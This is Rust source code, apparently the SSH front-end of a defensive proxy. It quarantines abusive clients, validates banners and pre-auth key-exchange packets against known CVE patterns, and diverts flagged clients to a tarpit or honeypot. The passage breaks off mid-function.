pub mod transport;

use mirage_deception::{
    GuardVerdict, MirageEngine, PrebakedPersona, ResponseAction, ThreatCategory,
};
use std::io;
use std::net::{IpAddr, SocketAddr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::Notify;
use tracing::{info, warn};

const SSH_MSG_DISCONNECT: u8 = 1;
const SSH_MSG_IGNORE: u8 = 2;
const SSH_MSG_UNIMPLEMENTED: u8 = 3;
const SSH_MSG_DEBUG: u8 = 4;
const SSH_MSG_EXT_INFO: u8 = 7;
const SSH_MSG_KEXINIT: u8 = 20;
const SSH_MSG_NEWKEYS: u8 = 21;
const SSH2_MSG_PING: u8 = 192;
const SSH2_MSG_PONG: u8 = 193;

const MAX_KEX_TOKENS_PER_LIST: usize = 64;

/// Run the Mirage Frontline SSH Reverse Proxy, Pre-Auth CVE Shield & Configurable Defense Engine.
pub async fn run_standalone_ssh_server(engine: Arc<MirageEngine>) -> io::Result<()> {
    let bind_addr = engine.config().ssh.bind_addr;
    let upstream = engine.config().ssh.upstream_sshd_addr;

    if let Some(banner) = probe_upstream_banner(upstream).await {
        info!(%upstream, %banner, "Cached real upstream OpenSSH banner for seamless shielding");
        engine.set_upstream_banner(banner);
    }

    let listener = TcpListener::bind(bind_addr).await?;
    info!(
        %bind_addr,
        %upstream,
        bruteforce_action = ?engine.config().ssh.bruteforce_action,
        cve_exploit_action = ?engine.config().ssh.cve_exploit_action,
        scanner_action = ?engine.config().ssh.scanner_action,
        max_total_conns = engine.config().ssh.max_total_connections,
        max_preauth_conns = engine.config().ssh.max_preauth_connections,
        max_honeypot_sessions = engine.config().ssh.max_honeypot_sessions,
        "Mirage Frontline SSH Shield listening"
    );
    serve_ssh_listener(listener, engine).await
}

/// Probe `upstream_addr` once to learn the exact real `SSH-2.0-...` identification banner.
pub async fn probe_upstream_banner(upstream_addr: SocketAddr) -> Option<String> {
    let mut stream = tokio::time::timeout(Duration::from_secs(3), TcpStream::connect(upstream_addr))
        .await
        .ok()?
        .ok()?;
    let line = tokio::time::timeout(Duration::from_secs(3), read_ssh_line(&mut stream, 512))
        .await
        .ok()?
        .ok()?;
    if line.starts_with("SSH-2.0-") || line.starts_with("SSH-1.99-") {
        Some(line)
    } else {
        None
    }
}

/// Serve an existing `TcpListener` with the Mirage Frontline SSH Reverse Proxy.
pub async fn serve_ssh_listener(
    listener: TcpListener,
    engine: Arc<MirageEngine>,
) -> io::Result<()> {
    loop {
        let (stream, peer_addr) = listener.accept().await?;
        let eng = engine.clone();
        tokio::spawn(async move {
            if let Err(err) = handle_ssh_connection(stream, peer_addr, eng).await {
                tracing::debug!(%peer_addr, error = %err, "SSH session closed");
            }
        });
    }
}

/// Handle a single incoming SSH TCP connection:
/// 1. Fixed-cap Anti-CC / DoS & Quarantine Guard (`IpGuardTable`, O(1), zero allocation):
///    - Trusted IPs splice directly to `upstream_sshd_addr`.
///    - Overloaded connections drop immediately at 0 CPU / 0 RAM.
///    - Quarantined IPs execute the configured `ResponseAction` for their `ThreatCategory`
///      (`fail2ban` instant drop / `ssh_honeypot` / `endlessh_tarpit` / `drop`).
/// 2. Zero-Touch Lazy Upstream Pre-Auth CVE Inspection:
///    - Validates client banner AND first `SSH_MSG_KEXINIT` packet BEFORE opening any socket to `upstream_sshd`.
/// 3. Clean connections relay untouched raw bytes to `upstream_sshd`, then splice encrypted traffic
///    while tracking rapid short-session brute-force bursts.
pub async fn handle_ssh_connection(
    mut stream: TcpStream,
    peer_addr: SocketAddr,
    engine: Arc<MirageEngine>,
) -> io::Result<()> {
    let _ = stream.set_nodelay(true);
    engine
        .metrics
        .ssh_connections_total
        .fetch_add(1, Ordering::Relaxed);

    let client_ip = peer_addr.ip();
    let cfg = &engine.config().ssh;
    let upstream_addr = cfg.upstream_sshd_addr;

    // 1. O(1) Anti-CC / DoS & Quarantine check
    let (verdict, _conn_permit) = engine.evaluate_incoming_connection(client_ip);
    match verdict {
        GuardVerdict::TrustedDirect => {
            engine
                .metrics
                .ssh_proxied_to_upstream
                .fetch_add(1, Ordering::Relaxed);
            return splice_to_upstream_sshd(stream, upstream_addr, None).await;
        }
        GuardVerdict::DropOverloaded(reason) => {
            engine
                .metrics
                .ssh_dropped_cc_dos
                .fetch_add(1, Ordering::Relaxed);
            tracing::debug!(%client_ip, reason, "CC/DoS cap exceeded; dropping connection immediately");
            return Ok(());
        }
        GuardVerdict::Quarantined { category, reason } => {
            let action = engine.action_for(category);
            let persona = engine.select_persona(client_ip);
            match action {
                ResponseAction::Fail2ban => {
                    engine
                        .metrics
                        .ssh_banned_fail2ban
                        .fetch_add(1, Ordering::Relaxed);
                    tracing::debug!(%client_ip, category = category.as_str(), reason, "Fail2Ban active: dropping banned client at 0 CPU");
                    return Ok(());
                }
                ResponseAction::Drop => return Ok(()),
                ResponseAction::EndlesshTarpit | ResponseAction::SshHoneypot => {
                    engine.record_event(
                        client_ip,
                        &persona,
                        "SSH-GUARD",
                        "QuarantinedClientHandled",
                        format!(
                            "Applying {:?} to quarantined {} client ({reason})",
                            action,
                            category.as_str()
                        ),
                    );
                    return dispatch_fresh_action(stream, engine, persona, client_ip, action).await;
                }
            }
        }
        GuardVerdict::InspectAndProxy => {}
    }

    // 2. Pre-auth concurrency cap (OpenSSH MaxStartups shield)
    let preauth_permit = match engine.try_acquire_preauth() {
        Some(p) => p,
        None => {
            engine
                .metrics
                .ssh_dropped_cc_dos
                .fetch_add(1, Ordering::Relaxed);
            return Ok(());
        }
    };

    let persona = engine.select_persona(client_ip);
    let preauth_timeout = Duration::from_secs(cfg.preauth_timeout_secs.max(1));
    let session_start = Instant::now();

    // 3. Lazy zero-touch pre-KEX path if we already know the real upstream OpenSSH banner
    if let Some(cached_banner) = engine.cached_upstream_banner() {
        stream
            .write_all(format!("{cached_banner}\r\n").as_bytes())
            .await?;
        stream.flush().await?;

        let client_banner = match tokio::time::timeout(
            preauth_timeout,
            read_ssh_line(&mut stream, cfg.max_banner_bytes.max(64)),
        )
        .await
        {
            Ok(Ok(line)) if !line.is_empty() => line,
            Ok(Ok(_)) => return Ok(()),
            Ok(Err(e)) => return Err(e),
            Err(_) => {
                record_preauth_block(
                    &engine,
                    client_ip,
                    &persona,
                    ThreatCategory::CveExploit,
                    "PreAuthBannerTimeout",
                    "Client exceeded preauth_timeout_secs before sending SSH banner",
                );
                return Ok(());
            }
        };

        if let Err(reason) = validate_client_banner(&client_banner, &engine) {
            let category = reason.category();
            let action = engine.action_for(category);
            record_preauth_block(
                &engine,
                client_ip,
                &persona,
                category,
                reason.trap_kind(),
                format!(
                    "Blocked client banner '{}': {}",
                    client_banner,
                    reason.detail()
                ),
            );
            drop(preauth_permit);
            return handle_violation_after_banner_sent(
                stream,
                engine,
                persona,
                client_ip,
                action,
                &client_banner,
                &cached_banner,
                None,
            )
            .await;
        }

        // Read & validate client's VERY FIRST SSH binary packet BEFORE connecting to upstream_sshd
        let (first_raw, first_payload) = match tokio::time::timeout(
            preauth_timeout,
            read_raw_ssh_packet(&mut stream, cfg.max_preauth_packet_bytes),
        )
        .await
        {
            Ok(Ok(pair)) => pair,
            Ok(Err(err)) => {
                record_preauth_block(
                    &engine,
                    client_ip,
                    &persona,
                    ThreatCategory::CveExploit,
                    "MalformedPreAuthPacket",
                    format!("Rejected first pre-auth SSH packet framing: {err}"),
                );
                return Ok(());
            }
            Err(_) => {
                record_preauth_block(
                    &engine,
                    client_ip,
                    &persona,
                    ThreatCategory::CveExploit,
                    "PreAuthKexTimeout",
                    "Client exceeded preauth_timeout_secs before sending SSH_MSG_KEXINIT",
                );
                return Ok(());
            }
        };

        let mut kexinit_seen = false;
        if let Err(reason) =
            inspect_preauth_client_payload(&first_payload, &engine, true, &mut kexinit_seen)
        {
            let action = engine.action_for(ThreatCategory::CveExploit);
            record_preauth_block(
                &engine,
                client_ip,
                &persona,
                ThreatCategory::CveExploit,
                "PreAuthCvePayloadBlocked",
                reason,
            );
            drop(preauth_permit);
            let pre_kex = if !first_payload.is_empty() && first_payload[0] == SSH_MSG_KEXINIT {
                Some(first_payload)
            } else {
                None
            };
            return handle_violation_after_banner_sent(
                stream,
                engine,
                persona,
                client_ip,
                action,
                &client_banner,
                &cached_banner,
                pre_kex,
            )
            .await;
        }

        // Both banner AND KEXINIT are 100% clean -> open upstream sshd and forward exact raw bytes
        let mut upstream = TcpStream::connect(upstream_addr).await?;
        let _ = upstream.set_nodelay(true);
        upstream
            .write_all(format!("{client_banner}\r\n").as_bytes())
            .await?;
        upstream.write_all(&first_raw).await?;
        upstream.flush().await?;

        let real_server_banner = match tokio::time::timeout(
            preauth_timeout,
            read_ssh_line(&mut upstream, 512),
        )
        .await
        {
            Ok(Ok(line)) if !line.is_empty() => line,
            _ => {
                return Err(io::Error::new(
                    io::ErrorKind::UnexpectedEof,
                    "upstream sshd closed before sending banner",
                ))
            }
        };

        if real_server_banner != cached_banner {
            engine.set_upstream_banner(real_server_banner);
            return Ok(());
        }

        let res = relay_and_inspect_preauth(
            stream,
            upstream,
            engine.clone(),
            persona.clone(),
            client_ip,
            preauth_timeout,
            preauth_permit,
            true,
        )
        .await;

        track_upstream_session_duration(&engine, &persona, client_ip, session_start.elapsed());
        return res;
    }

    // Fallback cold-start path (before upstream banner is cached)
    let client_banner = match tokio::time::timeout(
        preauth_timeout,
        read_ssh_line(&mut stream, cfg.max_banner_bytes.max(64)),
    )
    .await
    {
        Ok(Ok(line)) if !line.is_empty() => line,
        Ok(Ok(_)) => return Ok(()),
        Ok(Err(e)) => return Err(e),
        Err(_) => {
            record_preauth_block(
                &engine,
                client_ip,
                &persona,
                ThreatCategory::CveExploit,
                "PreAuthBannerTimeout",
                "Client failed to send SSH banner before preauth_timeout_secs",
            );
            return Ok(());
        }
    };

    if let Err(reason) = validate_client_banner(&client_banner, &engine) {
        let category = reason.category();
        let action = engine.action_for(category);
        record_preauth_block(
            &engine,
            client_ip,
            &persona,
            category,
            reason.trap_kind(),
            format!(
                "Blocked client banner '{}': {}",
                client_banner,
                reason.detail()
            ),
        );
        drop(preauth_permit);
        return handle_violation_before_banner_sent(
            stream,
            engine,
            persona,
            client_ip,
            action,
            &client_banner,
        )
        .await;
    }

    let mut upstream = TcpStream::connect(upstream_addr).await?;
    let _ = upstream.set_nodelay(true);
    upstream
        .write_all(format!("{client_banner}\r\n").as_bytes())
        .await?;
    upstream.flush().await?;

    let server_banner = match tokio::time::timeout(
        preauth_timeout,
        read_ssh_line(&mut upstream, 512),
    )
    .await
    {
        Ok(Ok(line)) if !line.is_empty() => line,
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                "upstream sshd closed before sending banner",
            ))
        }
    };
    engine.set_upstream_banner(server_banner.clone());

    stream
        .write_all(format!("{server_banner}\r\n").as_bytes())
        .await?;
    stream.flush().await?;

    let res = relay_and_inspect_preauth(
        stream,
        upstream,
        engine.clone(),
        persona.clone(),
        client_ip,
        preauth_timeout,
        preauth_permit,
        false,
    )
    .await;

    track_upstream_session_duration(&engine, &persona, client_ip, session_start.elapsed());
    res
}

fn record_preauth_block(
    engine: &MirageEngine,
    client_ip: IpAddr,
    persona: &PrebakedPersona,
    category: ThreatCategory,
    trap_kind: &str,
    detail: impl Into<String>,
) {
    let detail = detail.into();
    engine
        .metrics
        .ssh_blocked_preauth
        .fetch_add(1, Ordering::Relaxed);
    engine.flag_hostile_ip(client_ip, category, trap_kind);
    engine.record_event(client_ip, persona, "SSH-GUARD", trap_kind, detail);
}

fn track_upstream_session_duration(
    engine: &MirageEngine,
    persona: &PrebakedPersona,
    client_ip: IpAddr,
    elapsed: Duration,
) {
    let thresh = engine.config().ssh.bruteforce_short_session_secs;
    if thresh > 0 && elapsed < Duration::from_secs(thresh) {
        if engine.record_short_upstream_session(client_ip) {
            let action = engine.config().ssh.bruteforce_action;
            engine.record_event(
                client_ip,
                persona,
                "SSH-GUARD",
                "BruteForceBurstQuarantined",
                format!(
                    "Repeated short SSH sessions (<{thresh}s) detected; applying {action:?} to future connections from {client_ip}"
                ),
            );
        }
    }
}

async fn dispatch_fresh_action(
    mut stream: TcpStream,
    engine: Arc<MirageEngine>,
    persona: Arc<PrebakedPersona>,
    client_ip: IpAddr,
    action: ResponseAction,
) -> io::Result<()> {
    match action {
        ResponseAction::Drop => Ok(()),
        ResponseAction::Fail2ban => {
            engine
                .metrics
                .ssh_banned_fail2ban
                .fetch_add(1, Ordering::Relaxed);
            Ok(())
        }
        ResponseAction::EndlesshTarpit => {
            run_endlessh_tarpit(stream, &engine, &persona, client_ip, "quarantined").await
        }
        ResponseAction::SshHoneypot => {
            let Some(_hp_permit) = engine.try_acquire_honeypot(client_ip) else {
                engine
                    .metrics
                    .ssh_dropped_cc_dos
                    .fetch_add(1, Ordering::Relaxed);
                return Ok(());
            };
            engine
                .metrics
                .ssh_diverted_honeypot
                .fetch_add(1, Ordering::Relaxed);

            let server_banner = engine
                .cached_upstream_banner()
                .unwrap_or_else(|| persona.ssh_banner.clone());
            stream
                .write_all(format!("{server_banner}\r\n").as_bytes())
                .await?;
            stream.flush().await?;

            let timeout = Duration::from_secs(engine.config().ssh.preauth_timeout_secs.max(5));
            let client_banner = match tokio::time::timeout(
                timeout,
                read_ssh_line(&mut stream, engine.config().ssh.max_banner_bytes.max(64)),
            )
            .await
            {
                Ok(Ok(b)) if b.starts_with("SSH-2.0-") || b.starts_with("SSH-1.99-") => b,
                _ => return Ok(()),
            };

            transport::run_ssh2_deception_session(
                stream,
                engine,
                persona,
                client_ip,
                &client_banner,
                &server_banner,
                None,
            )
            .await
        }
    }
}

async fn handle_violation_before_banner_sent(
    mut stream: TcpStream,
    engine: Arc<MirageEngine>,
    persona: Arc<PrebakedPersona>,
    client_ip: IpAddr,
    action: ResponseAction,
    client_banner: &str,
) -> io::Result<()> {
    match action {
        ResponseAction::Drop => Ok(()),
        ResponseAction::Fail2ban => {
            engine
                .metrics
                .ssh_banned_fail2ban
                .fetch_add(1, Ordering::Relaxed);
            Ok(())
        }
        ResponseAction::EndlesshTarpit => {
            run_endlessh_tarpit(stream, &engine, &persona, client_ip, client_banner).await
        }
        ResponseAction::SshHoneypot => {
            if !(client_banner.starts_with("SSH-2.0-") || client_banner.starts_with("SSH-1.99-")) {
                return Ok(());
            }
            let Some(_hp_permit) = engine.try_acquire_honeypot(client_ip) else {
                engine
                    .metrics
                    .ssh_dropped_cc_dos
                    .fetch_add(1, Ordering::Relaxed);
                return Ok(());
            };
            engine
                .metrics
                .ssh_diverted_honeypot
                .fetch_add(1, Ordering::Relaxed);

            let server_banner = engine
                .cached_upstream_banner()
                .unwrap_or_else(|| persona.ssh_banner.clone());
            stream
                .write_all(format!("{server_banner}\r\n").as_bytes())
                .await?;
            stream.flush().await?;

            transport::run_ssh2_deception_session(
                stream,
                engine,
                persona,
                client_ip,
                client_banner,
                &server_banner,
                None,
            )
            .await
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn handle_violation_after_banner_sent(
    stream: TcpStream,
    engine: Arc<MirageEngine>,
    persona: Arc<PrebakedPersona>,
    client_ip: IpAddr,
    action: ResponseAction,
    client_banner: &str,
    server_banner: &str,
    pre_read_kexinit: Option<Vec<u8>>,
) -> io::Result<()> {
    match action {
        ResponseAction::Drop => Ok(()),
        ResponseAction::Fail2ban => {
            engine
                .metrics
                .ssh_banned_fail2ban
                .fetch_add(1, Ordering::Relaxed);
            Ok(())
        }
        ResponseAction::EndlesshTarpit => Ok(()),
        ResponseAction::SshHoneypot => {
            if !(client_banner.starts_with("SSH-2.0-") || client_banner.starts_with("SSH-1.99-")) {
                return Ok(());
            }
            let Some(_hp_permit) = engine.try_acquire_honeypot(client_ip) else {
                engine
                    .metrics
                    .ssh_dropped_cc_dos
                    .fetch_add(1, Ordering::Relaxed);
                return Ok(());
            };
            engine
                .metrics
                .ssh_diverted_honeypot
                .fetch_add(1, Ordering::Relaxed);

            transport::run_ssh2_deception_session(
                stream,
                engine,
                persona,
                client_ip,
                client_banner,
                server_banner,
                pre_read_kexinit,
            )
            .await
        }
    }
}

#[derive(Debug, Clone)]
enum BannerRejectReason {
    InvalidFormat(String),
    ScannerBanner,
    SigilViolation(String),
}

impl BannerRejectReason {
    fn category(&self) -> ThreatCategory {
        match self {
            Self::ScannerBanner => ThreatCategory::Scanner,
            Self::InvalidFormat(_) | Self::SigilViolation(_) => ThreatCategory::CveExploit,
        }
    }

    fn trap_kind(&self) -> &'static str {
        match self {
            Self::InvalidFormat(_) => "MalformedSshBanner",
            Self::ScannerBanner => "ScannerBannerIntercepted",
            Self::SigilViolation(_) => "SigilBannerViolation",
        }
    }

    fn detail(&self) -> &str {
        match self {
            Self::InvalidFormat(s) | Self::SigilViolation(s) => s.as_str(),
            Self::ScannerBanner => "matched configured scanner_ssh_banners signature",
        }
    }
}

fn validate_client_banner(banner: &str, engine: &MirageEngine) -> Result<(), BannerRejectReason> {
    let ssh_cfg = &engine.config().ssh;
    if banner.len() > ssh_cfg.max_banner_bytes {
        return Err(BannerRejectReason::InvalidFormat(format!(
            "banner length {} exceeds max_banner_bytes {}",
            banner.len(),
            ssh_cfg.max_banner_bytes
        )));
    }
    if !(banner.starts_with("SSH-2.0-") || banner.starts_with("SSH-1.99-")) {
        return Err(BannerRejectReason::InvalidFormat(
            "missing required SSH-2.0-/SSH-1.99- prefix".to_string(),
        ));
    }
    if !banner.bytes().all(|b| (0x20..=0x7e).contains(&b)) {
        return Err(BannerRejectReason::InvalidFormat(
            "banner contains non-printable or control bytes".to_string(),
        ));
    }

    let c_lower = banner.to_ascii_lowercase();
    if ssh_cfg
        .scanner_ssh_banners
        .iter()
        .any(|sig| c_lower.contains(&sig.to_ascii_lowercase()))
    {
        return Err(BannerRejectReason::ScannerBanner);
    }

    let sigil_cfg = &engine.config().sigil;
    if sigil_cfg.enabled && sigil_cfg.inspect_ssh_banners {
        let res = engine.sigil().detect(banner);
        if let Some(violation) = res.violation {
            engine
                .metrics
                .sigil_detections
                .fetch_add(1, Ordering::Relaxed);
            return Err(BannerRejectReason::SigilViolation(format!(
                "sigil-filter flagged {violation:?} (confidence={:.2})",
                res.confidence
            )));
        }
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
async fn relay_and_inspect_preauth(
    client: TcpStream,
    upstream: TcpStream,
    engine: Arc<MirageEngine>,
    persona: Arc<PrebakedPersona>,
    client_ip: IpAddr,
    preauth_timeout: Duration,
    preauth_permit: mirage_deception::PreAuthPermit,
    first_kexinit_already_forwarded: bool,
) -> io::Result<()> {
    let (mut client_r, mut client_w) = client.into_split();
    let (mut upstream_r, mut upstream_w) = upstream.into_split();

    let c2s_nk = Arc::new(AtomicBool::new(false));
    let s2c_nk = Arc::new(AtomicBool::new(false));
    let both_nk_notify = Arc::new(Notify::new());

    let eng_c2s = engine.clone();
    let persona_c2s = persona.clone();
    let c2s_nk_flag = c2s_nk.clone();
    let s2c_nk_peer = s2c_nk.clone();
    let notify_c2s = both_nk_notify.clone();
    let mut c2s_handle = tokio::spawn(async move {
        let mut preauth_pkts = usize::from(first_kexinit_already_forwarded);
        let mut kexinit_seen = first_kexinit_already_forwarded;
        let max_preauth_pkts = eng_c2s.config().ssh.max_preauth_packets.max(3);

        loop {
            let (raw_pkt, payload) = read_raw_ssh_packet(
                &mut client_r,
                eng_c2s.config().ssh.max_preauth_packet_bytes,
            )
            .await
            .map_err(|err| {
                record_preauth_block(
                    &eng_c2s,
                    client_ip,
                    &persona_c2s,
                    ThreatCategory::CveExploit,
                    "MalformedPreAuthPacket",
                    format!("Rejected client pre-auth SSH packet framing: {err}"),
                );
                err
            })?;

            preauth_pkts += 1;
            if preauth_pkts > max_preauth_pkts {
                let reason = format!(
                    "pre-NEWKEYS client packet count exceeded limit {max_preauth_pkts} (CVE-2025-26466 / pre-auth flood)"
                );
                record_preauth_block(
                    &eng_c2s,
                    client_ip,
                    &persona_c2s,
                    ThreatCategory::CveExploit,
                    "PreAuthPacketFloodBlocked",
                    reason.clone(),
                );
                return Err(io::Error::new(io::ErrorKind::InvalidData, reason));
            }

            let is_first_pkt = preauth_pkts == 1;
            if let Err(reason) =
                inspect_preauth_client_payload(&payload, &eng_c2s, is_first_pkt, &mut kexinit_seen)
            {
                record_preauth_block(
                    &eng_c2s,
                    client_ip,
                    &persona_c2s,
                    ThreatCategory::CveExploit,
                    "PreAuthCvePayloadBlocked",
                    reason.clone(),
                );
                warn!(%client_ip, %reason, "Blocked suspicious pre-auth SSH packet before upstream");
                return Err(io::Error::new(io::ErrorKind::InvalidData, reason));
            }

            let is_newkeys = payload[0] == SSH_MSG_NEWKEYS;
            upstream_w.write_all(&raw_pkt).await?;
            upstream_w.flush().await?;

            if is_newkeys {
                c2s_nk_flag.store(true, Ordering::SeqCst);
                if s2c_nk_peer.load(Ordering::SeqCst) {
                    eng_c2s
                        .metrics
                        .ssh_proxied_to_upstream
                        .fetch_add(1, Ordering::Relaxed);
                    notify_c2s.notify_waiters();
                }
                break;
            }
        }

        tokio::io::copy(&mut client_r, &mut upstream_w).await?;
        let _ = upstream_w.shutdown().await;
        Ok::<(), io::Error>(())
    });

    let max_pkt = engine.config().ssh.max_preauth_packet_bytes.max(65536);
    let eng_s2c = engine.clone();
    let s2c_nk_flag = s2c_nk.clone();
    let c2s_nk_peer = c2s_nk.clone();
    let notify_s2c = both_nk_notify.clone();
    let mut s2c_handle = tokio::spawn(async move {
        loop {
            let (raw_pkt, payload) = read_raw_ssh_packet(&mut upstream_r, max_pkt).await?;
            let is_newkeys = !payload.is_empty() && payload[0] == SSH_MSG_NEWKEYS;
            client_w.write_all(&raw_pkt).await?;
            client_w.flush().await?;
            if is_newkeys {
                s2c_nk_flag.store(true, Ordering::SeqCst);
                if c2s_nk_peer.load(Ordering::SeqCst) {
                    eng_s2c
                        .metrics
                        .ssh_proxied_to_upstream
                        .fetch_add(1, Ordering::Relaxed);
                    notify_s2c.notify_waiters();
                }
                break;
            }
        }

        tokio::io::copy(&mut upstream_r, &mut client_w).await?;
        let _ = client_w.shutdown().await;
        Ok::<(), io::Error>(())
    });

    let notified = both_nk_notify.notified();
    tokio::pin!(notified);
    if !(c2s_nk.load(Ordering::SeqCst) && s2c_nk.load(Ordering::SeqCst)) {
        tokio::select! {
            _ = tokio::time::sleep(preauth_timeout) => {
                record_preauth_block(
                    &engine,
                    client_ip,
                    &persona,
                    ThreatCategory::CveExploit,
                    "PreAuthKexTimeout",
                    "Terminated SSH connection exceeding preauth_timeout_secs before NEWKEYS",
                );
                c2s_handle.abort();
                s2c_handle.abort();
                return Ok(());
            }
            res = &mut c2s_handle => {
                s2c_handle.abort();
                return res.unwrap_or(Ok(()));
            }
            res = &mut s2c_handle => {
                c2s_handle.abort();
                return res.unwrap_or(Ok(()));
            }
            _ = &mut notified => {}
        }
    }

    drop(preauth_permit);

    tokio::select! {
        res = &mut c2s_handle => {
            let _ = s2c_handle.await;
            res.unwrap_or(Ok(()))
        }
        res = &mut s2c_handle => {
            let _ = c2s_handle.await;
            res.unwrap_or(Ok(()))
        }
    }
}

async fn read_raw_ssh_packet<R: AsyncRead + Unpin>(
    reader: &mut R,
    max_packet_bytes: usize,
) -> io::Result<(Vec<u8>, Vec<u8>)> {
    let mut len_buf = [0u8; 4];
    reader.read_exact(&mut len_buf).await?;
    let pkt_len = u32::from_be_bytes(len_buf) as usize;

    let max_allowed = max_packet_bytes.max(1024);
    if !(5..=max_allowed).contains(&pkt_len) {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("pre-auth SSH packet_length {pkt_len} out of bounds [5..={max_allowed}]"),
        ));
    }
    if (4 + pkt_len) % 8 != 0 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "pre-auth SSH packet total length not aligned to 8-byte block",
        ));
    }

    let mut raw = Vec::with_capacity(4 + pkt_len);
    raw.extend_from_slice(&len_buf);
    raw.resize(4 + pkt_len, 0);
    reader.read_exact(&mut raw[4..]).await?;

    let pad_len = raw[4] as usize;
    if pad_len < 4 || 1 + pad_len >= pkt_len {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("invalid pre-auth SSH padding_length {pad_len} for packet_length {pkt_len}"),
        ));
    }

    let payload_end = 4 + (pkt_len - pad_len);
    let payload = raw[5..payload_end].to_vec();
    Ok((raw, payload))
}

pub fn inspect_preauth_client_payload(
    payload: &[u8],
    engine: &MirageEngine,
    is_first_packet: bool,
    kexinit_seen: &mut bool,
) -> Result<(), String> {
    if payload.is_empty() {
        return Err("empty SSH packet payload".to_string());
    }

    let msg_type = payload[0];
    let ssh_cfg = &engine.config().ssh;
    let sigil_cfg = &engine.config().sigil;

    if msg_type == SSH2_MSG_PING || msg_type == SSH2_MSG_PONG {
        return Err(format!(
            "blocked pre-NEWKEYS SSH2_MSG_PING/PONG (opcode {msg_type}, CVE-2025-26466 DoS vector)"
        ));
    }

    if ssh_cfg.strict_kex_enforcement {
        if is_first_packet && msg_type != SSH_MSG_KEXINIT {
            return Err(format!(
                "strict-kex violation: first client packet must be SSH_MSG_KEXINIT (20), got {msg_type} (Terrapin / CVE-2023-48795)"
            ));
        }
        if matches!(
            msg_type,
            SSH_MSG_IGNORE | SSH_MSG_DEBUG | SSH_MSG_UNIMPLEMENTED
        ) {
            return Err(format!(
                "strict-kex violation: pre-NEWKEYS opcode {msg_type} forbidden before initial NEWKEYS (Terrapin / CVE-2023-48795)"
            ));
        }
    }

    let allowed = matches!(
        msg_type,
        SSH_MSG_DISCONNECT
            | SSH_MSG_IGNORE
            | SSH_MSG_UNIMPLEMENTED
            | SSH_MSG_DEBUG
            | SSH_MSG_EXT_INFO
            | SSH_MSG_KEXINIT
            | SSH_MSG_NEWKEYS
            | 30..=49
    );
    if !allowed {
        return Err(format!(
            "out-of-state pre-NEWKEYS SSH message opcode {msg_type}"
        ));
    }

    if msg_type == SSH_MSG_KEXINIT {
        if *kexinit_seen {
            return Err(
                "duplicate SSH_MSG_KEXINIT before initial NEWKEYS (CVE-2023-25136 / state confusion)"
                    .to_string(),
            );
        }
        *kexinit_seen = true;
        if sigil_cfg.inspect_kex_packets {
            inspect_kexinit_payload(payload, engine, ssh_cfg.max_kex_namelist_bytes)?;
        }
    } else if msg_type == SSH_MSG_DEBUG && sigil_cfg.enabled && sigil_cfg.inspect_kex_packets {
        inspect_debug_payload(payload, engine)?;
    }

    Ok(())
}

fn inspect_kexinit_payload(
    payload: &[u8],
    engine: &MirageEngine,
    max_namelist_bytes: usize,
) -> Result<(), String> {
    if payload.len() < 1 + 16 + 40 + 1 + 4 {
        return Err("truncated SSH_MSG_KEXINIT payload".to_string());
    }

    let mut pos = 17;
    const LIST_NAMES: [&str; 10] = [
        "kex_algorithms",
        "server_host_key_algorithms",
        "encryption_algorithms_c2s",
        "encryption_algorithms_s2c",
        "mac_algorithms_c2s",
        "mac_algorithms_s2c",
        "compression_algorithms_c2s",
        "compression_algorithms_s2c",
        "languages_c2s",
        "languages_s2c",
    ];

    for list_name in LIST_NAMES {
        if pos + 4 > payload.len() {
            return Err(format!("truncated KEXINIT length for {list_name}"));
        }
        let len = u32::from_be_bytes([
            payload[pos],
            payload[pos + 1],
            payload[pos + 2],
            payload[pos + 3],
        ]) as usize;
        pos += 4;

        if len > max_namelist_bytes {
            return Err(format!(
                "KEXINIT field '{list_name}' length {len} exceeds max_kex_namelist_bytes {max_namelist_bytes}"
            ));
        }
        if pos + len > payload.len() {
            return Err(format!("truncated KEXINIT body for {list_name}"));
        }
        let slice = &payload[pos..pos + len];
        pos += len;

        if !slice.iter().all(|&b| (0x20..=0x7e).contains(&b)) {
            return Err(format!(
                "KEXINIT field '{list_name}' contains non-ASCII or control bytes"
            ));
        }

        if !slice.is_empty() {
            let text = std::str::from_utf8(slice)
                .map_err(|_| format!("KEXINIT field '{list_name}' is not valid UTF-8"))?;

            if engine.config().sigil.enabled {
                let res = engine.sigil().detect(text);
                if let Some(violation) = res.violation {
                    engine
                        .metrics
                        .sigil_detections
                        .fetch_add(1, Ordering::Relaxed);
                    return Err(format!(
                        "sigil-filter flagged KEXINIT '{list_name}' ({violation:?}, confidence={:.2})",
                        res.confidence
                    ));
                }
            }

            let mut token_count = 0usize;
            for tok in text.split(',') {
                token_count += 1;
                if token_count > MAX_KEX_TOKENS_PER_LIST {
                    return Err(format!(
                        "KEXINIT field '{list_name}' exceeds max {MAX_KEX_TOKENS_PER_LIST} algorithm tokens"
                    ));
                }
                if tok.is_empty()
                    || tok.len() > 128
                    || !tok
                        .bytes()
                        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'@' | b'+'))
                {
                    return Err(format!(
                        "KEXINIT field '{list_name}' contains malformed algorithm identifier '{tok}'"
                    ));
                }
            }
        }
    }

    if pos + 5 != payload.len() {
        return Err("invalid trailing bytes in SSH_MSG_KEXINIT".to_string());
    }

    Ok(())
}

fn inspect_debug_payload(payload: &[u8], engine: &MirageEngine) -> Result<(), String> {
    if payload.len() < 1 + 1 + 4 {
        return Err("truncated SSH_MSG_DEBUG payload".to_string());
    }
    let mut pos = 2;
    let msg_len = u32::from_be_bytes([
        payload[pos],
        payload[pos + 1],
        payload[pos + 2],
        payload[pos + 3],
    ]) as usize;
    pos += 4;
    if pos + msg_len > payload.len() {
        return Err("truncated SSH_MSG_DEBUG message".to_string());
    }
    let msg = std::str::from_utf8(&payload[pos..pos + msg_len])
        .map_err(|_| "non-UTF8 SSH_MSG_DEBUG message".to_string())?;
    let res = engine.sigil().detect(msg);
    if let Some(violation) = res.violation {
        engine
            .metrics
            .sigil_detections
